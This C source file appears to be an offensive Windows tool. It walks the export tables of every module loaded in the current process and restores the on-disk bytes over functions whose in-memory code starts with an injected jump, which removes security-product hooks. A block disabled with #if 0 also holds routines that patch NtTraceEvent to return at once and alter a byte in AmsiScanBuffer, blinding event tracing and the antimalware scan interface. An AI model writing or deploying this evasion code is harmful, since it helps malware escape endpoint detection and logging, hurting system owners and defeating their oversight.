#include "header.h"
// RVA = offset in file. This have to be added to the base memory
// VirtualAddress = the virtual address in memory if we consider that it is located at the expected base addr. Due to ASLR et co, we have to add a delta and convert it to RVA

int ListDllFunctions(const unsigned char* dllPath, LPVOID baseAddress_infile, LPVOID baseAddress_inmem, BOOL do_patch) {
	struct pe_structs structs_inmem = get_structs_from_baseAddr(baseAddress_inmem);
	struct pe_structs structs_infile = get_structs_from_baseAddr(baseAddress_infile); // should be the same than structs_inmem?


	DWORD oldProtection = 0;
	DWORD oldProtectionafter = 0;
	if (do_patch == TRUE) {
		int ret = VirtualProtect((LPVOID)((DWORD_PTR)baseAddress_inmem + (DWORD_PTR)structs_inmem.secHeader->VirtualAddress), structs_inmem.secHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
		if (ret == 0) {
			printf("VirtualProtect failed\n");
			exit(-1);
		}
	}
	PIMAGE_EXPORT_DIRECTORY exportDirectory_inmem = (PIMAGE_EXPORT_DIRECTORY)convert_RVA_to_virtualAddressInMem(baseAddress_inmem, structs_inmem.ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	
	PIMAGE_EXPORT_DIRECTORY exportDirectory_infile = (PIMAGE_EXPORT_DIRECTORY)convert_RVA_to_virtualAddressInFile(baseAddress_infile, structs_infile.ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	
	
	DWORD* nameRVAs_inmem = (DWORD*)convert_RVA_to_virtualAddressInMem(baseAddress_inmem, exportDirectory_inmem->AddressOfNames);
	DWORD* nameRVAs_infile = (DWORD*)convert_RVA_to_virtualAddressInFile(baseAddress_infile, exportDirectory_infile->AddressOfNames);

	
	DWORD* functionRVAs_inmem = (DWORD*)convert_RVA_to_virtualAddressInMem(baseAddress_inmem, exportDirectory_inmem->AddressOfFunctions);
	DWORD* functionRVAs_infile = (DWORD*)convert_RVA_to_virtualAddressInFile(baseAddress_infile, exportDirectory_infile->AddressOfFunctions);

	
	WORD* ordinals_inmem = (WORD*)convert_RVA_to_virtualAddressInMem(baseAddress_inmem, exportDirectory_inmem->AddressOfNameOrdinals);
	WORD* ordinals_infile = (WORD*)convert_RVA_to_virtualAddressInFile(baseAddress_infile, exportDirectory_infile->AddressOfNameOrdinals);
	

	if (exportDirectory_infile->NumberOfNames != exportDirectory_inmem->NumberOfNames) {
		printf("Error in number of names. File has %d names while mem has %d name\n", exportDirectory_infile->NumberOfNames, exportDirectory_inmem->NumberOfNames);
	}
	else {
		printf("Number of names: has %d name\n", exportDirectory_infile->NumberOfNames);
	}
	int nb_function_modified = 0;
	
	for (DWORD i = 0; i < exportDirectory_infile->NumberOfNames; i++) {
		DWORD matching_i = 0;

		unsigned char* functionName_inmem;
		unsigned char* functionName_infile = (unsigned char*)convert_RVA_to_virtualAddressInFile(baseAddress_infile, nameRVAs_infile[i]);
		while (matching_i < exportDirectory_inmem->NumberOfNames) {
			functionName_inmem = (unsigned char*)convert_RVA_to_virtualAddressInMem(baseAddress_inmem, nameRVAs_inmem[matching_i]);
			if (strcmp(functionName_inmem, functionName_infile) == 0) {
				break;
			}
			matching_i++;
		}
		if (matching_i == exportDirectory_inmem->NumberOfNames) {
			printf("a function in file was not found in memory\n");
			exit(-1);
		}

		PVOID RVA_inmem = functionRVAs_inmem[ordinals_inmem[matching_i]];
		PVOID RVA_infile = functionRVAs_infile[ordinals_infile[i]];
		unsigned char* addr_inmem = (unsigned char*)convert_RVA_to_virtualAddressInMem(baseAddress_inmem, RVA_inmem);
		unsigned char* addr_infile = (unsigned char*)convert_RVA_to_virtualAddressInFile(baseAddress_infile, RVA_infile);

		if(is_RVA_in_text_section_InFile(baseAddress_infile, RVA_infile) == TRUE && is_RVA_in_text_section_InMem(baseAddress_inmem, RVA_inmem) == TRUE){ // check if function is in text section.
			
			if (addr_inmem[0] != addr_infile[0]) { // We have a difference

				//find the end of the difference.
				int count = 0;
				while (count < 50)
				{
					if (addr_inmem[count] == addr_infile[count] && addr_inmem[count + 1] == addr_infile[count + 1] && addr_inmem[count + 2] == addr_infile[count + 2])
						break;
					count++;
				}

				// Print the function that has been changed and what bytes are changed								
				printf("function %s (%p) in %s is modified. Restart at offset %d : ", functionName_inmem, addr_inmem, dllPath, count);
				for (int i = 0; i < count + 1; ++i) {
					printf("%02X", (unsigned char)addr_inmem[i]);
				}
				printf(" was ");
				for (int i = 0; i < count + 1; ++i) {
					printf("%02X", (unsigned char)addr_infile[i]);
				}
				printf("\n");

				// Ensure that the modification is a jump
				if ((unsigned char)addr_inmem[0] != 0xE9) {
					printf("\t\tWARNING not E9 jump\n");
				}
				else {

					// unhook
					if (do_patch == TRUE) {
						for (int i = 0; i < count; ++i) {
							addr_inmem[i] = addr_infile[i];
						}
					}
				}
				nb_function_modified++;
			}

		}
		else {
			//printf("Function %s is NOT in text\n", functionName_inmem);
		}
	}


	if (nb_function_modified > 0)
		printf("\t\tNumber of function modified in %s : %d/%d\n", dllPath, nb_function_modified, exportDirectory_infile->NumberOfNames);
	printf("\n\n\n");

	if (do_patch == TRUE) {
		int ret;
		ret = VirtualProtect((LPVOID)((DWORD_PTR)baseAddress_inmem + (DWORD_PTR)structs_inmem.secHeader->VirtualAddress), structs_inmem.secHeader->Misc.VirtualSize, oldProtection, &oldProtectionafter);
		if (ret == 0) {
			printf("VirtualProtectfailed\n");
		}
	}
	return nb_function_modified;

}

void ListLoadedModules() {
	HANDLE processHandle = GetCurrentProcess();
	HMODULE hMods[1024];
	DWORD cbNeeded;
	unsigned int i;


	TCHAR current_bin_path[1024];
	DWORD size = GetModuleFileName(NULL, current_bin_path, 1024);


	if (EnumProcessModules(processHandle, hMods, sizeof(hMods), &cbNeeded)) {
		for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
			MODULEINFO modInfo;
			TCHAR szModName[MAX_PATH];

			if (GetModuleInformation(processHandle, hMods[i], &modInfo, sizeof(modInfo))) {
				if (GetModuleFileNameEx(processHandle, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR))) {
					if (strcmp(current_bin_path, szModName) != 0) {

						size_t sPeSize;
						unsigned char* infile = get_file(szModName, &sPeSize);
						if (infile == NULL) {
							printf("Ignoring %s\n", szModName);
							continue;
						}
						else {
							printf("Analysing %s\n", szModName);
						}



						if (ListDllFunctions(szModName, infile, modInfo.lpBaseOfDll, FALSE) > 0) {
							printf("Patching...\n");
							ListDllFunctions(szModName, infile, modInfo.lpBaseOfDll, TRUE);
							printf("Check :\n");
							if (ListDllFunctions(szModName, infile, modInfo.lpBaseOfDll, FALSE) > 0) {
								printf("FAILED UNHOOK\n");
								exit(-1);
							}
						}

					}
				}
			}
		}
	}
}

#if 0
int patch_etw(LPVOID baseAddress_inmem) {
	DWORD oldProtection = 0;
	DWORD oldProtectionafter = 0;
	int status = 0;



	PIMAGE_DOS_HEADER dosHeader_inmem = (PIMAGE_DOS_HEADER)baseAddress_inmem;
	if (dosHeader_inmem->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("Invalid DOS signature.\n");
		return;
	}

	PIMAGE_NT_HEADERS ntHeaders_inmem = (PIMAGE_NT_HEADERS)((BYTE*)baseAddress_inmem + dosHeader_inmem->e_lfanew);
	if (ntHeaders_inmem->Signature != IMAGE_NT_SIGNATURE) {
		printf("Invalid NT signature.\n");
		return;
	}

	PIMAGE_EXPORT_DIRECTORY exportDirectory_inmem;
	DWORD exportDirRVA_inmem = ntHeaders_inmem->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (exportDirRVA_inmem == 0) {
		printf("No export table found.\n");
		return;
	}

	exportDirectory_inmem = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)baseAddress_inmem + exportDirRVA_inmem);

	DWORD* nameRVAs_inmem = (DWORD*)((BYTE*)baseAddress_inmem + exportDirectory_inmem->AddressOfNames);

	DWORD* functionRVAs_inmem = (DWORD*)((BYTE*)baseAddress_inmem + exportDirectory_inmem->AddressOfFunctions);

	WORD* ordinals_inmem = (WORD*)((BYTE*)baseAddress_inmem + exportDirectory_inmem->AddressOfNameOrdinals);


	for (DWORD i = 0; i < exportDirectory_inmem->NumberOfNames; i++) {


		unsigned char* functionName_inmem = functionName_inmem = (unsigned char*)((BYTE*)baseAddress_inmem + nameRVAs_inmem[i]);
		unsigned char* addr_inmem = (unsigned char*)((BYTE*)baseAddress_inmem + functionRVAs_inmem[ordinals_inmem[i]]);




		if (strcmp(functionName_inmem, "NtTraceEvent") != 0) {
			continue;
		}
		printf("  ** NtTraceEvent IS FOUND :) **\n");
		if (addr_inmem[0] != 0xc3) {
			status = 1;
			VirtualProtect(addr_inmem, 1, PAGE_EXECUTE_READWRITE, &oldProtection);
			printf("%x -> ", addr_inmem[0]);
			addr_inmem[0] = 0xc3;//RET instruction
			printf("%x\n", addr_inmem[0]);
			VirtualProtect(addr_inmem, 1, oldProtection, &oldProtectionafter);
			printf("NtTraceEvent patched !\n");
		}
		else {
			printf("NtTraceEvent is already patched\n");
		}



	}
	return status;


}
int patch_amsi(LPVOID baseAddress_inmem) {
	DWORD oldProtection = 0;
	DWORD oldProtectionafter = 0;
	int status = 0;



	PIMAGE_DOS_HEADER dosHeader_inmem = (PIMAGE_DOS_HEADER)baseAddress_inmem;
	if (dosHeader_inmem->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("Invalid DOS signature.\n");
		return;
	}

	PIMAGE_NT_HEADERS ntHeaders_inmem = (PIMAGE_NT_HEADERS)((BYTE*)baseAddress_inmem + dosHeader_inmem->e_lfanew);
	if (ntHeaders_inmem->Signature != IMAGE_NT_SIGNATURE) {
		printf("Invalid NT signature.\n");
		return;
	}

	PIMAGE_EXPORT_DIRECTORY exportDirectory_inmem;
	DWORD exportDirRVA_inmem = ntHeaders_inmem->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (exportDirRVA_inmem == 0) {
		printf("No export table found.\n");
		return;
	}

	exportDirectory_inmem = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)baseAddress_inmem + exportDirRVA_inmem);

	DWORD* nameRVAs_inmem = (DWORD*)((BYTE*)baseAddress_inmem + exportDirectory_inmem->AddressOfNames);

	DWORD* functionRVAs_inmem = (DWORD*)((BYTE*)baseAddress_inmem + exportDirectory_inmem->AddressOfFunctions);

	WORD* ordinals_inmem = (WORD*)((BYTE*)baseAddress_inmem + exportDirectory_inmem->AddressOfNameOrdinals);


	for (DWORD i = 0; i < exportDirectory_inmem->NumberOfNames; i++) {


		unsigned char* functionName_inmem = functionName_inmem = (unsigned char*)((BYTE*)baseAddress_inmem + nameRVAs_inmem[i]);
		unsigned char* addr_inmem = (unsigned char*)((BYTE*)baseAddress_inmem + functionRVAs_inmem[ordinals_inmem[i]]);




		if (strcmp(functionName_inmem, "AmsiScanBuffer") != 0) {
			continue;
		}
		printf("  ** AmsiScanBuffer IS FOUND :) **\n");
		if (addr_inmem[0x83] != 0x74) {
			status = 1;
			VirtualProtect(&addr_inmem[0x83], 1, PAGE_EXECUTE_READWRITE, &oldProtection);
			printf("%x -> ", addr_inmem[0x83]);
			addr_inmem[0x83] = 0x74;//RET instruction
			printf("%x\n", addr_inmem[0x83]);
			VirtualProtect(&addr_inmem[0x83], 1, oldProtection, &oldProtectionafter);
			printf("AmsiScanBuffer patched !\n");
		}
		else {
			printf("AmsiScanBuffer is already patched\n");
		}
	}
	return status;


}
#endif

int main_unhook(int argc, char* argv[]) {
	ListLoadedModules();
	//printf("Done\n");
	return 0;
}